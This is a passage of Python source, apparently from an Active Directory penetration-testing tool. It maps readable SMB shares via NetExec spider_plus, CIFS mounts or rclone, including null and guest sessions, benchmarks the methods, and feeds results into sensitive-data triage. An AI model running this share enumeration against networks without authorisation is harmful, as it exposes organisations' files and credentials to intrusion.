        history_runs = []
    history_runs.append(history_entry)
    history_payload["runs"] = history_runs[-500:]
    history_payload["updated_at"] = created_at

    try:
        write_json_file(run_file_abs, run_payload)
        write_json_file(history_abs, history_payload)
        marked_run_rel = mark_sensitive(run_file_rel, "path")
        marked_history_rel = mark_sensitive(history_rel, "path")
        print_info(
            "SMB mapping benchmark results saved to "
            f"{marked_run_rel} (history: {marked_history_rel})."
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning("SMB mapping benchmark completed, but persistence failed.")
        print_warning_debug(
            "SMB mapping benchmark persistence error: "
            f"{type(exc).__name__}: {exc}"
        )


def _normalize_benchmark_method_results(
    results: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """Normalize benchmark method results for stable history persistence."""
    normalized: list[dict[str, Any]] = []
    for item in results:
        method = str(item.get("method", "") or "").strip()
        if not method:
            continue
        try:
            duration = float(item.get("duration_seconds", 0.0) or 0.0)
        except Exception:
            duration = 0.0
        normalized.append(
            {
                "method": method,
                "success": bool(item.get("success")),
                "duration_seconds": max(0.0, duration),
            }
        )
    return normalized


def run_smb_map_benchmark_history(
    shell: Any,
    *,
    domain: str,
    recent_limit: int = 10,
    days: int | None = None,
    csv_output_path: str | None = None,
) -> None:
    """Render historical SMB mapping benchmark comparison from persisted JSON."""
    from adscan_internal.workspaces import read_json_file

    workspace_cwd = shell._get_workspace_cwd()
    history_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
        "history.json",
    )
    history_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
        "history.json",
    )
    if not os.path.exists(history_abs):
        marked_history_rel = mark_sensitive(history_rel, "path")
        print_warning(
            "No SMB mapping benchmark history found yet. "
            f"Expected file: {marked_history_rel}"
        )
        return

    payload = read_json_file(history_abs)
    runs = payload.get("runs", [])
    if not isinstance(runs, list) or not runs:
        marked_history_rel = mark_sensitive(history_rel, "path")
        print_info(
            "SMB mapping benchmark history is empty in "
            f"{marked_history_rel}."
        )
        return

    safe_limit = max(1, min(int(recent_limit), 100))
    sorted_runs_all = sorted(
        (item for item in runs if isinstance(item, dict)),
        key=lambda item: str(item.get("created_at", "")),
        reverse=True,
    )
    filtered_runs = sorted_runs_all
    if days is not None:
        safe_days = max(1, int(days))
        cutoff = datetime.now(timezone.utc) - timedelta(days=safe_days)
        day_filtered_runs: list[dict[str, Any]] = []
        for entry in sorted_runs_all:
            created_at = _parse_history_created_at(entry)
            if created_at is None:
                continue
            if created_at >= cutoff:
                day_filtered_runs.append(entry)
        filtered_runs = day_filtered_runs
        print_info_debug(
            "SMB benchmark history day filter applied: "
            f"days={safe_days} runs_before={len(sorted_runs_all)} "
            f"runs_after={len(filtered_runs)}"
        )

    if not filtered_runs:
        print_warning(
            "No SMB mapping benchmark runs match the selected filter criteria."
        )
        return

    recent_runs = filtered_runs[:safe_limit]

    history_table = Table(
        title="[bold cyan]SMB Mapping Benchmark History[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    history_table.add_column("#", style="cyan", justify="right")
    history_table.add_column("Run ID", style="cyan")
    history_table.add_column("When (UTC)", style="magenta")
    history_table.add_column("Methods", style="yellow")
    history_table.add_column("Fastest", style="green")
    history_table.add_column("Duration (s)", style="green", justify="right")
    history_table.add_column("Success", style="blue", justify="right")

    for idx, entry in enumerate(recent_runs, start=1):
        run_id = str(entry.get("run_id", "") or "-")
        created_at = str(entry.get("created_at", "") or "-")
        selected_methods = entry.get("selected_methods", [])
        if isinstance(selected_methods, list):
            rendered_methods = ", ".join(str(method) for method in selected_methods[:4])
            if len(selected_methods) > 4:
                rendered_methods += ", ..."
            rendered_methods = rendered_methods or "-"
        else:
            rendered_methods = "-"
        fastest_method = str(entry.get("fastest_successful_method", "") or "-")
        fastest_duration = entry.get("fastest_successful_duration_seconds")
        duration_text = (
            f"{float(fastest_duration):.3f}"
            if isinstance(fastest_duration, (int, float))
            else "-"
        )
        success_count = int(entry.get("success_count", 0) or 0)
        results_count = int(entry.get("results_count", 0) or 0)
        history_table.add_row(
            str(idx),
            run_id,
            created_at,
            rendered_methods,
            fastest_method,
            duration_text,
            f"{success_count}/{results_count}",
        )

    print_panel_with_table(history_table, border_style=BRAND_COLORS["info"])

    method_stats = _summarize_benchmark_method_stats(
        shell=shell,
        runs=filtered_runs,
        workspace_cwd=workspace_cwd,
    )
    if not method_stats:
        print_warning(
            "No per-method benchmark statistics could be derived from history."
        )
        return

    stats_table = Table(
        title="[bold cyan]SMB Mapping Benchmark Method Summary[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    stats_table.add_column("Method", style="cyan")
    stats_table.add_column("Runs", style="magenta", justify="right")
    stats_table.add_column("Success", style="blue", justify="right")
    stats_table.add_column("Success %", style="yellow", justify="right")
    stats_table.add_column("Avg Success (s)", style="green", justify="right")
    stats_table.add_column("Best Success (s)", style="green", justify="right")

    for method, stats in sorted(
        method_stats.items(),
        key=lambda item: item[1]["avg_success_seconds"]
        if item[1]["avg_success_seconds"] is not None
        else 10_000_000.0,
    ):
        success_rate = (
            (stats["successes"] / stats["runs"]) * 100.0 if stats["runs"] > 0 else 0.0
        )
        avg_text = (
            f"{float(stats['avg_success_seconds']):.3f}"
            if isinstance(stats["avg_success_seconds"], (int, float))
            else "-"
        )
        best_text = (
            f"{float(stats['best_success_seconds']):.3f}"
            if isinstance(stats["best_success_seconds"], (int, float))
            else "-"
        )
        stats_table.add_row(
            method,
            str(int(stats["runs"])),
            str(int(stats["successes"])),
            f"{success_rate:.1f}",
            avg_text,
            best_text,
        )

    print_panel_with_table(stats_table, border_style=BRAND_COLORS["info"])
    if csv_output_path is not None:
        _export_smb_mapping_benchmark_history_csv(
            shell=shell,
            domain=domain,
            runs=filtered_runs,
            workspace_cwd=workspace_cwd,
            csv_output_path=csv_output_path,
        )


def _summarize_benchmark_method_stats(
    *,
    shell: Any,
    runs: list[dict[str, Any]],
    workspace_cwd: str,
) -> dict[str, dict[str, Any]]:
    """Compute per-method benchmark stats across persisted run history."""
    method_durations: dict[str, list[float]] = {}
    method_successes: dict[str, int] = {}
    method_runs: dict[str, int] = {}

    for entry in runs:
        method_results = _resolve_history_method_results(
            entry=entry,
            workspace_cwd=workspace_cwd,
        )

        for result in method_results:
            method = str(result.get("method", "") or "").strip()
            if not method:
                continue
            success = bool(result.get("success"))
            duration = float(result.get("duration_seconds", 0.0) or 0.0)
            method_runs[method] = int(method_runs.get(method, 0)) + 1
            if success:
                method_successes[method] = int(method_successes.get(method, 0)) + 1
                method_durations.setdefault(method, []).append(max(0.0, duration))

    stats: dict[str, dict[str, Any]] = {}
    for method, runs_count in method_runs.items():
        durations = method_durations.get(method, [])
        avg_success = (
            (sum(durations) / len(durations)) if durations else None
        )
        best_success = min(durations) if durations else None
        stats[method] = {
            "runs": int(runs_count),
            "successes": int(method_successes.get(method, 0)),
            "avg_success_seconds": avg_success,
            "best_success_seconds": best_success,
        }
    return stats


def _resolve_history_method_results(
    *,
    entry: dict[str, Any],
    workspace_cwd: str,
) -> list[dict[str, Any]]:
    """Resolve normalized per-method results for one history entry."""
    from adscan_internal.workspaces import read_json_file

    method_results = entry.get("method_results", [])
    if isinstance(method_results, list) and method_results:
        return _normalize_benchmark_method_results(method_results)

    run_file_rel = str(entry.get("run_file", "") or "").strip()
    if not run_file_rel:
        return []
    run_file_abs = os.path.join(workspace_cwd, run_file_rel)
    if not os.path.exists(run_file_abs):
        return []
    run_payload = read_json_file(run_file_abs)
    raw_results = run_payload.get("results", [])
    if not isinstance(raw_results, list):
        return []
    return _normalize_benchmark_method_results(raw_results)


def _parse_history_created_at(entry: dict[str, Any]) -> datetime | None:
    """Parse one history entry ``created_at`` into timezone-aware datetime."""
    created_at_text = str(entry.get("created_at", "") or "").strip()
    if not created_at_text:
        return None
    normalized = created_at_text.replace("Z", "+00:00")
    try:
        parsed = datetime.fromisoformat(normalized)
    except Exception:
        return None
    if parsed.tzinfo is None:
        return parsed.replace(tzinfo=timezone.utc)
    return parsed.astimezone(timezone.utc)


def _export_smb_mapping_benchmark_history_csv(
    *,
    shell: Any,
    domain: str,
    runs: list[dict[str, Any]],
    workspace_cwd: str,
    csv_output_path: str | None,
) -> None:
    """Export filtered benchmark history into CSV (one row per method result)."""
    output_rel, output_abs = _resolve_benchmark_csv_output_path(
        shell=shell,
        domain=domain,
        workspace_cwd=workspace_cwd,
        csv_output_path=csv_output_path,
    )
    rows: list[dict[str, Any]] = []
    for entry in runs:
        method_results = _resolve_history_method_results(
            entry=entry,
            workspace_cwd=workspace_cwd,
        )
        for result in method_results:
            rows.append(
                {
                    "run_id": str(entry.get("run_id", "") or ""),
                    "created_at": str(entry.get("created_at", "") or ""),
                    "principal": str(entry.get("principal", "") or ""),
                    "hosts_count": int(entry.get("hosts_count", 0) or 0),
                    "shares_count": int(entry.get("shares_count", 0) or 0),
                    "method": str(result.get("method", "") or ""),
                    "success": bool(result.get("success")),
                    "duration_seconds": float(result.get("duration_seconds", 0.0) or 0.0),
                }
            )

    fieldnames = [
        "run_id",
        "created_at",
        "principal",
        "hosts_count",
        "shares_count",
        "method",
        "success",
        "duration_seconds",
    ]
    try:
        os.makedirs(os.path.dirname(output_abs), exist_ok=True)
        with open(output_abs, "w", encoding="utf-8", newline="") as handle:
            writer = csv.DictWriter(handle, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(rows)
        marked_output = mark_sensitive(output_rel, "path")
        print_info(
            f"SMB benchmark history CSV exported to {marked_output}."
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning("SMB benchmark history CSV export failed.")
        print_warning_debug(
            "SMB benchmark history CSV export error: "
            f"{type(exc).__name__}: {exc}"
        )


def _resolve_benchmark_csv_output_path(
    *,
    shell: Any,
    domain: str,
    workspace_cwd: str,
    csv_output_path: str | None,
) -> tuple[str, str]:
    """Resolve benchmark CSV output as (workspace-relative, absolute)."""
    if csv_output_path:
        candidate = str(csv_output_path).strip()
        if os.path.isabs(candidate):
            output_abs = candidate
            output_rel = os.path.relpath(candidate, workspace_cwd)
        else:
            output_rel = candidate
            output_abs = os.path.join(workspace_cwd, candidate)
        return output_rel, output_abs

    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    filename = f"history_{timestamp}.csv"
    output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
        "exports",
        filename,
    )
    output_abs = os.path.join(workspace_cwd, output_rel)
    return output_rel, output_abs


def _build_spider_plus_auth(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> str:
    """Build NetExec auth args for spider_plus based on the current session."""
    lowered = username.strip().lower()
    if lowered == "null":
        return '-u "" -p ""'
    if lowered == "guest" and password == "":
        return shell.build_auth_nxc("ADscan", "", domain)
    return shell.build_auth_nxc(username, password, domain)


def _slugify_token(token: str) -> str:
    """Return a filesystem-safe token for output folder naming."""
    slug = re.sub(r"[^a-zA-Z0-9_.-]+", "_", token or "").strip("_")
    return slug or "unknown"


def _resolve_cifs_mount_root(
    *,
    shell: Any,
    domain: str,
) -> str:
    """Resolve CIFS mount root path from shell/env/default workspace path."""
    configured_root = str(getattr(shell, "smb_cifs_mount_root", "") or "").strip()
    env_root = os.getenv("ADSCAN_SMB_CIFS_MOUNT_ROOT", "").strip()
    default_root = domain_path(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
        "mounts",
    )

    for candidate in [configured_root, env_root, default_root]:
        if not candidate:
            continue
        if os.path.isdir(candidate):
            return os.path.abspath(candidate)
    return os.path.abspath(configured_root or env_root or default_root)


def _resolve_cifs_host_share_targets(
    *,
    hosts: list[str],
    shares: list[str],
    share_map: dict[str, dict[str, str]] | None,
) -> list[tuple[str, str]]:
    """Resolve host/share targets for CIFS mount attempts."""
    targets: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()

    if isinstance(share_map, dict):
        for host, host_shares in share_map.items():
            host_name = str(host or "").strip()
            if not host_name or not isinstance(host_shares, dict):
                continue
            for share, perms in host_shares.items():
                share_name = str(share or "").strip()
                perms_text = str(perms or "").strip().lower()
                if (
                    not share_name
                    or _is_globally_excluded_mapping_share(share_name)
                    or "read" not in perms_text
                ):
                    continue
                key = (host_name.lower(), share_name.lower())
                if key in seen:
                    continue
                seen.add(key)
                targets.append((host_name, share_name))

    if targets:
        return targets

    for host in hosts:
        host_name = str(host or "").strip()
        if not host_name:
            continue
        for share in shares:
            share_name = str(share or "").strip()
            if not share_name or _is_globally_excluded_mapping_share(share_name):
                continue
            key = (host_name.lower(), share_name.lower())
            if key in seen:
                continue
            seen.add(key)
            targets.append((host_name, share_name))
    return targets


def _mount_cifs_targets_via_host_helper(
    *,
    domain: str,
    username: str,
    password: str,
    mount_root: str,
    targets: list[tuple[str, str]],
) -> list[str]:
    """Best-effort CIFS share mounts via host-helper; returns mountpoints to cleanup."""
    helper_sock = os.getenv("ADSCAN_HOST_HELPER_SOCK", "").strip()
    if not helper_sock or not os.path.exists(helper_sock):
        marked_sock = mark_sensitive(helper_sock or "<unset>", "path")
        print_info_debug(
            "CIFS host-helper mount skipped: missing helper socket "
            f"({marked_sock})."
        )
        return []

    try:
        from adscan_internal.host_privileged_helper import host_helper_client_request
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            "CIFS host-helper mount skipped: could not import host helper client."
        )
        return []

    mounted_points: list[str] = []
    mounted_count = 0
    already_mounted_count = 0
    failed_count = 0

    for host, share in targets:
        marked_host = mark_sensitive(host, "hostname")
        marked_share = mark_sensitive(share, "service")
        try:
            resp = host_helper_client_request(
                helper_sock,
                op="cifs_mount_share",
                payload={
                    "host": host,
                    "share": share,
                    "mount_root": mount_root,
                    "username": username,
                    "password": password,
                    "domain": domain,
                    "read_only": True,
                },
                timeout_seconds=180,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            failed_count += 1
            print_warning_debug(
                "CIFS host-helper mount request failed: "
                f"host={marked_host} share={marked_share} "
                f"error={type(exc).__name__}: {exc}"
            )
            continue
        if not resp.ok:
            failed_count += 1
            print_warning_debug(
                "CIFS host-helper mount failed: "
                f"host={marked_host} share={marked_share} "
                f"message={resp.message or '-'} rc={resp.returncode}"
            )
            continue

        mount_point = ""
        mounted_by_helper = False
        try:
            payload = json.loads(resp.stdout or "{}")
            mount_point = str(payload.get("mount_point", "")).strip()
            mounted_by_helper = bool(payload.get("mounted_by_helper", False))
        except Exception:
            mount_point = ""
            mounted_by_helper = False

        if mounted_by_helper and mount_point:
            mounted_count += 1
            mounted_points.append(mount_point)
        else:
            already_mounted_count += 1

    marked_root = mark_sensitive(mount_root, "path")
    print_info_debug(
        "CIFS host-helper mount summary: "
        f"mount_root={marked_root} targets={len(targets)} "
        f"mounted={mounted_count} already_mounted={already_mounted_count} "
        f"failed={failed_count}"
    )
    return mounted_points


def _unmount_cifs_targets_via_host_helper(
    *,
    mount_points: list[str],
) -> None:
    """Best-effort unmount of CIFS targets previously mounted by host-helper."""
    if not mount_points:
        return

    helper_sock = os.getenv("ADSCAN_HOST_HELPER_SOCK", "").strip()
    if not helper_sock or not os.path.exists(helper_sock):
        marked_sock = mark_sensitive(helper_sock or "<unset>", "path")
        print_warning_debug(
            "CIFS unmount skipped: host helper socket unavailable "
            f"({marked_sock})."
        )
        return

    try:
        from adscan_internal.host_privileged_helper import host_helper_client_request
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug("CIFS unmount skipped: cannot import host helper client.")
        return

    unmounted = 0
    failed = 0
    for mount_point in mount_points:
        try:
            resp = host_helper_client_request(
                helper_sock,
                op="cifs_unmount_share",
                payload={"mount_point": mount_point, "lazy": True},
                timeout_seconds=90,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            failed += 1
            marked_mount = mark_sensitive(mount_point, "path")
            print_warning_debug(
                "CIFS unmount request raised exception: "
                f"mount_point={marked_mount} error={type(exc).__name__}: {exc}"
            )
            continue
        if resp.ok:
            unmounted += 1
        else:
            failed += 1
            marked_mount = mark_sensitive(mount_point, "path")
            print_warning_debug(
                "CIFS unmount failed: "
                f"mount_point={marked_mount} message={resp.message or '-'} "
                f"rc={resp.returncode}"
            )

    print_info_debug(
        "CIFS unmount summary: "
        f"requested={len(mount_points)} unmounted={unmounted} failed={failed}"
    )


def run_smb_share_tree_mapping_with_cifs(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    cifs_mount_root: str | None = None,
    selected_method: str | None = None,
    run_post_mapping_workflow: bool = True,
) -> bool:
    """Map SMB share trees from CIFS mount paths and run post-mapping workflow."""
    from adscan_internal.services.cifs_share_mapping_service import (
        CIFSShareMappingService,
    )
    from adscan_internal.services.share_mapping_service import ShareMappingService

    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)

    if not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"No SMB hosts available for CIFS mapping in domain {marked_domain}."
        )
        return False
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No SMB shares eligible for CIFS mapping after applying global "
            f"exclusions in {marked_domain}."
        )
        return False

    effective_mount_root = str(cifs_mount_root or "").strip() or _resolve_cifs_mount_root(
        shell=shell,
        domain=domain,
    )
    marked_mount_root = mark_sensitive(effective_mount_root, "path")
    mount_targets = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    mounted_points: list[str] = []
    try:
        mounted_points = _mount_cifs_targets_via_host_helper(
            domain=domain,
            username=username,
            password=password,
            mount_root=effective_mount_root,
            targets=mount_targets,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            "CIFS host-helper mount orchestration failed unexpectedly; continuing "
            "with pre-existing mount state."
        )

    if not os.path.isdir(effective_mount_root):
        print_warning(
            "CIFS mapping root is not accessible. "
            f"Expected mounted content at {marked_mount_root}."
        )
        print_warning(
            "Fallback recommendation: use spider_plus + AI or deterministic mode."
        )
        _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        return False

    cifs_root_abs = domain_path(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
    )
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_id = f"cifs_{timestamp}_{_slugify_token(username)}"
    run_folder = f"{timestamp}_{_slugify_token(username)}"
    run_output_abs = os.path.join(cifs_root_abs, "runs", run_folder)
    os.makedirs(run_output_abs, exist_ok=True)
    aggregate_map_abs = os.path.join(cifs_root_abs, "share_tree_map.json")
    aggregate_map_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
        "share_tree_map.json",
    )
    marked_aggregate_rel = mark_sensitive(aggregate_map_rel, "path")

    try:
        print_operation_header(
            "SMB Share Tree Mapping (CIFS)",
            [
                ("Domain", mark_sensitive(domain, "domain")),
                ("Principal", mark_sensitive(username, "user")),
                ("Hosts", str(len(hosts))),
                ("Readable Shares", str(len(shares))),
                ("CIFS Root", marked_mount_root),
                ("Run Output", mark_sensitive(run_output_abs, "path")),
                ("Aggregate JSON", marked_aggregate_rel),
            ],
            icon="🗺️",
        )
        cifs_service = CIFSShareMappingService()
        mapping_result = cifs_service.generate_host_metadata_json(
            mount_root=effective_mount_root,
            run_output_dir=run_output_abs,
            hosts=hosts,
            shares=shares,
        )

        service = ShareMappingService()
        principal_label = f"{domain}\\{username}"
        summary = service.merge_spider_plus_run(
            domain=domain,
            principal=principal_label,
            run_id=run_id,
            run_output_dir=run_output_abs,
            aggregate_map_path=aggregate_map_abs,
            requested_hosts=hosts,
            requested_shares=shares,
            host_share_permissions=share_map,
        )

        host_json_count = int(summary.get("host_json_files", 0))
        merged_files = int(summary.get("merged_file_entries", 0))
        mapped_shares = int(mapping_result.get("mapped_shares", 0))
        if host_json_count == 0:
            print_warning(
                "CIFS mapping found no host metadata files to consolidate. "
                "Verify mount structure host/share/path."
            )
        else:
            print_success(
                f"CIFS share mapping updated with {host_json_count} host file(s), "
                f"{mapped_shares} mapped share(s), and {merged_files} file metadata entries."
            )
        print_info(f"Consolidated SMB share tree map saved to {marked_aggregate_rel}.")
        if run_post_mapping_workflow:
            _run_post_mapping_sensitive_data_workflow(
                shell,
                domain=domain,
                aggregate_map_abs=aggregate_map_abs,
                aggregate_map_rel=aggregate_map_rel,
                shares=shares,
                hosts=hosts,
                triage_username=username,
                triage_password=password,
                selected_method=selected_method,
                cifs_mount_root=effective_mount_root,
            )
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error while executing CIFS SMB share mapping.")
        print_exception(show_locals=False, exception=exc)
        print_error_debug(traceback.format_exc())
        return False
    finally:
        try:
            _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                "CIFS unmount cleanup failed unexpectedly after mapping workflow."
            )


def run_smb_share_tree_mapping_with_spider_plus(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    selected_method: str | None = None,
    run_post_mapping_workflow: bool = True,
) -> bool:
    """Run NetExec spider_plus and consolidate results into one domain map JSON."""
    from adscan_internal.services.share_mapping_service import ShareMappingService

    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)

    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return False

    if not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"No SMB hosts available for spider_plus mapping in domain {marked_domain}."
        )
        return False
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No SMB shares eligible for spider_plus mapping after applying global "
            f"exclusions in {marked_domain}."
        )
        return False

    workspace_cwd = shell._get_workspace_cwd()
    spider_plus_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
    )
    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_folder = f"{run_id}_{_slugify_token(username)}"
    run_output_abs = os.path.join(spider_plus_root_abs, "runs", run_folder)
    os.makedirs(run_output_abs, exist_ok=True)
    run_output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
        "runs",
        run_folder,
    )
    aggregate_map_abs = os.path.join(spider_plus_root_abs, "share_tree_map.json")
    aggregate_map_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
        "share_tree_map.json",
    )

    auth_args = _build_spider_plus_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    hosts_arg = " ".join(shlex.quote(str(host)) for host in hosts)
    module_options = [
        f"EXCLUDE_EXTS={','.join(GLOBAL_SMB_MAPPING_EXCLUDED_EXTENSIONS)}",
        f"EXCLUDE_FILTER={','.join(GLOBAL_SMB_MAPPING_EXCLUDE_FILTER_TOKENS)}",
        f"OUTPUT_FOLDER={run_output_abs}",
    ]
    module_options_arg = " ".join(shlex.quote(option) for option in module_options)
    command = (
        f"{shell.netexec_path} smb {hosts_arg} {auth_args} --smb-timeout 30 "
        f"-M spider_plus -o {module_options_arg}"
    )

    marked_domain = mark_sensitive(domain, "domain")
    marked_username = mark_sensitive(username, "user")
    marked_output_rel = mark_sensitive(run_output_rel, "path")
    marked_aggregate_rel = mark_sensitive(aggregate_map_rel, "path")

    print_operation_header(
        "SMB Share Tree Mapping (spider_plus)",
        details={
            "Domain": marked_domain,
            "Principal": marked_username,
            "Hosts": str(len(hosts)),
            "Readable Shares": str(len(shares)),
            "Download Mode": "Metadata only",
            "Run Output": marked_output_rel,
            "Aggregate JSON": marked_aggregate_rel,
        },
        icon="🕸️",
    )
    print_info_debug(f"Command: {command}")

    try:
        completed_process = shell._run_netexec(
            command,
            domain=domain,
            timeout=1200,
            pre_sync=False,
        )
        if completed_process is None:
            print_error(
                "NetExec spider_plus mapping failed before returning any output."
            )
            return False

        if completed_process.returncode != 0:
            error_message = (
                completed_process.stderr or completed_process.stdout or ""
            ).strip()
            print_warning(
                "NetExec spider_plus returned a non-zero exit code. "
                "Attempting to consolidate any metadata produced."
            )
            if error_message:
                print_warning_debug(error_message)

        service = ShareMappingService()
        principal_label = f"{domain}\\{username}"
        summary = service.merge_spider_plus_run(
            domain=domain,
            principal=principal_label,
            run_id=run_id,
            run_output_dir=run_output_abs,
            aggregate_map_path=aggregate_map_abs,
            requested_hosts=hosts,
            requested_shares=shares,
            host_share_permissions=share_map,
        )
        host_json_count = int(summary.get("host_json_files", 0))
        merged_files = int(summary.get("merged_file_entries", 0))

        if host_json_count == 0:
            print_warning(
                "No spider_plus JSON host metadata files were generated. "
                "The consolidated mapping file was still updated."
            )
        else:
            print_success(
                f"SMB share mapping updated with {host_json_count} host file(s) and "
                f"{merged_files} file metadata entries."
            )
        print_info(f"Consolidated SMB share tree map saved to {marked_aggregate_rel}.")
        if run_post_mapping_workflow:
            try:
                _run_post_mapping_sensitive_data_workflow(
                    shell,
                    domain=domain,
                    aggregate_map_abs=aggregate_map_abs,
                    aggregate_map_rel=aggregate_map_rel,
                    shares=shares,
                    hosts=hosts,
                    triage_username=username,
                    triage_password=password,
                    selected_method=selected_method,
                )
            except Exception as triage_exc:  # noqa: BLE001
                telemetry.capture_exception(triage_exc)
                print_warning(
                    "SMB share mapping completed, but post-mapping sensitive-data analysis "
                    "failed and was skipped."
                )
                print_warning_debug(
                    "Post-mapping sensitive-data analysis failure: "
                    f"{type(triage_exc).__name__}: {triage_exc}"
                )
                print_warning_debug(traceback.format_exc())
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error while executing spider_plus SMB share mapping.")
        print_exception(show_locals=False, exception=exc)
        print_error_debug(traceback.format_exc())
        return False


def _resolve_rclone_path(shell: Any) -> str:
    """Resolve rclone executable path from shell attributes or PATH fallback."""
    configured_path = str(getattr(shell, "rclone_path", "") or "").strip()
    return configured_path or "rclone"


def run_smb_share_tree_mapping_with_rclone(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    selected_method: str | None = None,
    run_post_mapping_workflow: bool = True,
) -> bool:
    """Run rclone SMB metadata mapping and consolidate into one domain map JSON."""
    from adscan_internal.services.rclone_share_mapping_service import (
        RcloneShareMappingService,
    )
    from adscan_internal.services.share_mapping_service import ShareMappingService

    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)

    if not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"No SMB hosts available for rclone mapping in domain {marked_domain}."
        )
        return False
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No SMB shares eligible for rclone mapping after applying global "
            f"exclusions in {marked_domain}."
        )
        return False

    rclone_path = _resolve_rclone_path(shell)
    rclone_version_cmd = f"{shlex.quote(rclone_path)} version"
    version_result = shell.run_command(
        rclone_version_cmd,
        timeout=30,
        ignore_errors=True,
    )
    if version_result is None or int(getattr(version_result, "returncode", 1)) != 0:
        print_error(
            "rclone is not available. Install it and ensure it is in PATH "
            "to use rclone SMB mapping."
        )
        return False

    workspace_cwd = shell._get_workspace_cwd()
    rclone_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
    )
    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_folder = f"{run_id}_{_slugify_token(username)}"
    run_output_abs = os.path.join(rclone_root_abs, "runs", run_folder)
    os.makedirs(run_output_abs, exist_ok=True)
    run_output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "runs",
        run_folder,
    )
    aggregate_map_abs = os.path.join(rclone_root_abs, "share_tree_map.json")
    aggregate_map_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "share_tree_map.json",
    )

    target_pairs = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    marked_domain = mark_sensitive(domain, "domain")
    marked_username = mark_sensitive(username, "user")
    marked_output_rel = mark_sensitive(run_output_rel, "path")
    marked_aggregate_rel = mark_sensitive(aggregate_map_rel, "path")
    marked_rclone = mark_sensitive(rclone_path, "path")

    print_operation_header(
        "SMB Share Tree Mapping (rclone)",
        details={
            "Domain": marked_domain,
            "Principal": marked_username,
            "Hosts": str(len(hosts)),
            "Readable Shares": str(len(shares)),
            "Targets": str(len(target_pairs)),
            "Run Output": marked_output_rel,
            "Aggregate JSON": marked_aggregate_rel,
            "rclone": marked_rclone,
        },
        icon="🧭",
    )

    try:
        rclone_service = RcloneShareMappingService()
        mapping_result = rclone_service.generate_host_metadata_json(
            run_output_dir=run_output_abs,
            host_share_targets=target_pairs,
            username=username,
            password=password,
            domain=domain,
            command_executor=shell.run_command,
            rclone_path=rclone_path,
            timeout_seconds=1200,
        )

        service = ShareMappingService()
        principal_label = f"{domain}\\{username}"
        summary = service.merge_spider_plus_run(
            domain=domain,
            principal=principal_label,
            run_id=run_id,
            run_output_dir=run_output_abs,
